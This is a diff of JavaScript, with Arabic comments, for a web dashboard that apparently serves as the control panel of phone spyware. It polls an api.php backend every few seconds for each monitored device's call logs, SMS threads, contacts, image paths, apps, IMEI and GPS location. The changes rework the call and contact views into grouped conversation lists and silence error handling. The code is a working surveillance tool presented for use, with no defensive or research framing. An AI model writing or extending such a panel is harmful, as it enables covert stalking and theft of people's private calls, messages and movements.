@@ -1,4 +1,3 @@
-// التحقق من تسجيل الدخول
 if (sessionStorage.getItem('logged_in') !== 'true') {
     window.location.href = 'login.html';
 }
@@ -9,13 +8,15 @@ let dataInterval = null;
 let allCalls = [];
 let allSMS = [];
 let allContacts = [];
+let currentChat = null;
+let currentCallNumber = null;
+let currentContact = null;
 
 function logout() {
     sessionStorage.removeItem('logged_in');
     window.location.href = 'login.html';
 }
 
-// حذف الجهاز
 async function deleteDevice() {
     if (!currentDevice) return;
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
@@ -26,12 +27,9 @@ async function deleteDevice() {
         loadDevices();
         currentDevice = null;
         document.getElementById('deviceSelect').value = '';
-    } catch (e) {
-        alert('خطأ في الحذف');
-    }
+    } catch (e) {}
 }
 
-// تحميل الأجهزة
 async function loadDevices() {
     try {
         const response = await fetch('/devices.json');
@@ -48,29 +46,19 @@ async function loadDevices() {
             select.appendChild(option);
         });
         
-        if (currentValue) {
-            select.value = currentValue;
-        }
-    } catch (e) {
-        console.error('Devices error:', e);
-    }
+        if (currentValue) select.value = currentValue;
+    } catch (e) {}
 }
 
 function selectDevice(deviceId) {
     currentDevice = deviceId;
-    
     if (updateInterval) clearInterval(updateInterval);
     if (dataInterval) clearInterval(dataInterval);
     
     if (deviceId) {
-        // تحديث الحالة كل 3 ثوانٍ
         updateInterval = setInterval(updateLiveData, 3000);
-        
-        // تحديث البيانات الكاملة كل 5 ثوانٍ
         dataInterval = setInterval(() => {
-            if (currentDevice) {
-                loadAllData();
-            }
+            if (currentDevice) loadAllData();
         }, 5000);
         
         updateLiveData();
@@ -123,9 +111,7 @@ async function updateLiveData() {
         if (data.apps_count !== undefined) 
             document.getElementById('appsCount').textContent = `(${data.apps_count})`;
         
-    } catch (e) {
-        console.error('Live error:', e);
-    }
+    } catch (e) {}
 }
 
 async function loadAllData() {
@@ -143,43 +129,87 @@ async function loadCalls() {
         const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=call_logs`);
         const newCalls = await response.json();
         
-        // تحقق إذا تغيرت البيانات
         if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
             allCalls = newCalls;
-            displayCalls(allCalls);
+            if (currentCallNumber) {
+                openCallDetail(currentCallNumber);
+            } else {
+                displayCallsList();
+            }
         }
     } catch (e) {}
 }
 
-function displayCalls(calls) {
-    const tbody = document.querySelector('#callsTable tbody');
-    tbody.innerHTML = '';
+function displayCallsList() {
+    const listDiv = document.getElementById('callsListView');
+    const detailDiv = document.getElementById('callDetailView');
+    detailDiv.style.display = 'none';
+    listDiv.style.display = 'block';
     
-    if (!calls || calls.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#888;">لا توجد مكالمات</td></tr>';
+    listDiv.innerHTML = '';
+    
+    if (!allCalls || allCalls.length === 0) {
+        listDiv.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>';
         return;
     }
     
-    calls.forEach(call => {
-        const row = document.createElement('tr');
-        row.innerHTML = `
-            <td><span class="clickable" onclick="openChat('${call.number || ''}')">${call.number || 'غير معروف'}</span></td>
-            <td>${call.name || '—'}</td>
-            <td><span class="call-type type-${call.type}">${getCallType(call.type)}</span></td>
-            <td>${formatDuration(call.duration)}</td>
-            <td>${formatDate(call.date)}</td>
+    // تجميع حسب الرقم
+    const callGroups = {};
+    allCalls.forEach(call => {
+        const number = call.number || 'غير معروف';
+        if (!callGroups[number]) {
+            callGroups[number] = [];
+        }
+        callGroups[number].push(call);
+    });
+    
+    Object.keys(callGroups).forEach(number => {
+        const calls = callGroups[number];
+        const lastCall = calls[0]; // الأحدث
+        
+        const div = document.createElement('div');
+        div.className = 'conversation-item';
+        div.onclick = () => openCallDetail(number);
+        div.innerHTML = `
+            <div class="conversation-avatar">📞</div>
+            <div class="conversation-info">
+                <div class="conversation-name">${number}</div>
+                <div class="conversation-preview">
+                    ${getCallType(lastCall.type)} • ${formatDuration(lastCall.duration)} • ${formatDate(lastCall.date)}
+                </div>
+            </div>
+            <div class="conversation-count">${calls.length} مكالمة</div>
         `;
-        tbody.appendChild(row);
+        listDiv.appendChild(div);
     });
 }
 
-function filterCalls() {
-    const search = document.getElementById('callSearch').value.toLowerCase();
-    const filtered = allCalls.filter(call => 
-        (call.number || '').toLowerCase().includes(search) ||
-        (call.name || '').toLowerCase().includes(search)
-    );
-    displayCalls(filtered);
+function openCallDetail(number) {
+    currentCallNumber = number;
+    document.getElementById('callsListView').style.display = 'none';
+    document.getElementById('callDetailView').style.display = 'block';
+    document.getElementById('callDetailTitle').textContent = `📞 ${number}`;
+    
+    const detailsDiv = document.getElementById('callDetailsList');
+    detailsDiv.innerHTML = '';
+    
+    const calls = allCalls.filter(call => call.number === number);
+    
+    calls.forEach(call => {
+        const div = document.createElement('div');
+        div.className = 'call-detail-item';
+        div.innerHTML = `
+            <span class="call-type type-${call.type}">${getCallType(call.type)}</span>
+            <span>⏱️ ${formatDuration(call.duration)}</span>
+            <span>📅 ${formatDate(call.date)}</span>
+        `;
+        detailsDiv.appendChild(div);
+    });
+}
+
+function backToCallsList() {
+    currentCallNumber = null;
+    displayCallsList();
 }
 
 // ============ الرسائل ============
@@ -215,9 +245,7 @@ function displayConversations() {
     const conversations = {};
     allSMS.forEach(sms => {
         const number = sms.address || 'غير معروف';
-        if (!conversations[number]) {
-            conversations[number] = [];
-        }
+        if (!conversations[number]) conversations[number] = [];
         conversations[number].push(sms);
     });
     
@@ -279,41 +307,80 @@ async function loadContacts() {
         
         if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
             allContacts = newContacts;
-            displayContacts(allContacts);
+            if (currentContact) {
+                openContactDetail(currentContact);
+            } else {
+                displayContactsList();
+            }
         }
     } catch (e) {}
 }
 
-function displayContacts(contacts) {
-    const tbody = document.querySelector('#contactsTable tbody');
-    tbody.innerHTML = '';
+function displayContactsList() {
+    const listDiv = document.getElementById('contactsListView');
+    const detailDiv = document.getElementById('contactDetailView');
+    detailDiv.style.display = 'none';
+    listDiv.style.display = 'block';
     
-    if (!contacts || contacts.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#888;">لا توجد جهات اتصال</td></tr>';
+    listDiv.innerHTML = '';
+    
+    if (!allContacts || allContacts.length === 0) {
+        listDiv.innerHTML = '<p style="color:#888;">لا توجد جهات اتصال</p>';
         return;
     }
     
-    contacts.forEach(contact => {
+    allContacts.forEach(contact => {
         const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
-        const row = document.createElement('tr');
-        row.innerHTML = `
-            <td>${contact.name || 'بدون اسم'}</td>
-            <td>${numbers.join(', ')}</td>
-            <td>
-                ${numbers.map(n => `<button class="action-btn" onclick="openChat('${n}')">💬</button>`).join(' ')}
-            </td>
+        
+        const div = document.createElement('div');
+        div.className = 'conversation-item';
+        div.onclick = () => openContactDetail(contact.name);
+        div.innerHTML = `
+            <div class="conversation-avatar">👤</div>
+            <div class="conversation-info">
+                <div class="conversation-name">${contact.name || 'بدون اسم'}</div>
+                <div class="conversation-preview">${numbers.join(', ')}</div>
+            </div>
+            <button class="action-btn" onclick="event.stopPropagation(); openChat('${numbers[0]}')">💬</button>
         `;
-        tbody.appendChild(row);
+        listDiv.appendChild(div);
     });
 }
 
-function filterContacts() {
-    const search = document.getElementById('contactSearch').value.toLowerCase();
-    const filtered = allContacts.filter(contact => 
-        (contact.name || '').toLowerCase().includes(search) ||
-        (Array.isArray(contact.numbers) ? contact.numbers.join(' ') : '').toLowerCase().includes(search)
-    );
-    displayContacts(filtered);
+function openContactDetail(name) {
+    currentContact = name;
+    document.getElementById('contactsListView').style.display = 'none';
+    document.getElementById('contactDetailView').style.display = 'block';
+    
+    const contact = allContacts.find(c => c.name === name);
+    const detailsDiv = document.getElementById('contactDetails');
+    
+    if (!contact) return;
+    
+    const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
+    
+    detailsDiv.innerHTML = `
+        <div class="contact-detail-card">
+            <div class="contact-avatar">👤</div>
+            <h4>${contact.name || 'بدون اسم'}</h4>
+            <div class="contact-numbers">
+                ${numbers.map(n => `
+                    <div class="contact-number-item">
+                        <span>${n}</span>
+                        <div>
+                            <button class="action-btn" onclick="openChat('${n}')">💬</button>
+                            <button class="action-btn" onclick="openCallDetail('${n}')">📞</button>
+                        </div>
+                    </div>
+                `).join('')}
+            </div>
+        </div>
+    `;
+}
+
+function backToContactsList() {
+    currentContact = null;
+    displayContactsList();
 }
 
 // ============ الصور ============
@@ -334,27 +401,24 @@ async function loadImages() {
             const div = document.createElement('div');
             div.className = 'image-item';
             
-            const img = document.createElement('img');
-            img.src = image.path || '';
-            img.className = 'thumb';
-            img.alt = image.name || `صورة ${index + 1}`;
-            img.onerror = function() {
-                this.style.display = 'none';
-                this.parentElement.innerHTML = '<div class="no-image">📷 صورة غير متاحة</div>';
-            };
-            img.onclick = () => window.open(img.src, '_blank');
+            const icon = document.createElement('div');
+            icon.className = 'image-icon';
+            icon.textContent = '🖼️';
             
             const name = document.createElement('div');
             name.className = 'image-name';
             name.textContent = image.name || `صورة ${index + 1}`;
             
-            div.appendChild(img);
+            const path = document.createElement('div');
+            path.className = 'image-path';
+            path.textContent = image.path || '';
+            
+            div.appendChild(icon);
             div.appendChild(name);
+            div.appendChild(path);
             grid.appendChild(div);
         });
-    } catch (e) {
-        console.error('Images error:', e);
-    }
+    } catch (e) {}
 }
 
 // ============ التطبيقات ============
@@ -402,10 +466,7 @@ async function loadDeviceInfo() {
                 <div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div>
                 <div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div>
                 <div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div>
-                <div class="info-card"><span>الرقم التسلسلي:</span><strong>${info.sim_serial || '—'}</strong></div>
                 <div class="info-card"><span>الناقل:</span><strong>${info.carrier || '—'}</strong></div>
-                <div class="info-card"><span>الذاكرة:</span><strong>${formatBytes(info.total_ram)}</strong></div>
-                <div class="info-card"><span>المساحة الحرة:</span><strong>${formatBytes(info.free_storage)}</strong></div>
             </div>
         `;
     } catch (e) {}
@@ -418,8 +479,6 @@ function showLocationDetails(location) {
         div.innerHTML = `
             <p>📍 خط العرض: ${location.latitude.toFixed(6)}</p>
             <p>📍 خط الطول: ${location.longitude.toFixed(6)}</p>
-            <p>📏 الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
-            <p>🚗 السرعة: ${location.speed ? location.speed + ' م/ث' : '—'}</p>
         `;
     }
 }
@@ -438,18 +497,12 @@ function switchTab(tabName) {
 
 function formatDuration(seconds) {
     if (!seconds || seconds < 0) return '0:00';
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
+    return `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
 }
 
 function formatDate(timestamp) {
     if (!timestamp) return '—';
-    try {
-        return new Date(timestamp).toLocaleString('ar');
-    } catch (e) {
-        return '—';
-    }
+    try { return new Date(timestamp).toLocaleString('ar'); } catch (e) { return '—'; }
 }
 
 function formatBytes(bytes) {
@@ -469,6 +522,5 @@ function getCallType(type) {
     }
 }
 
-// تحميل الأجهزة عند الفتح
 loadDevices();
 setInterval(loadDevices, 10000);
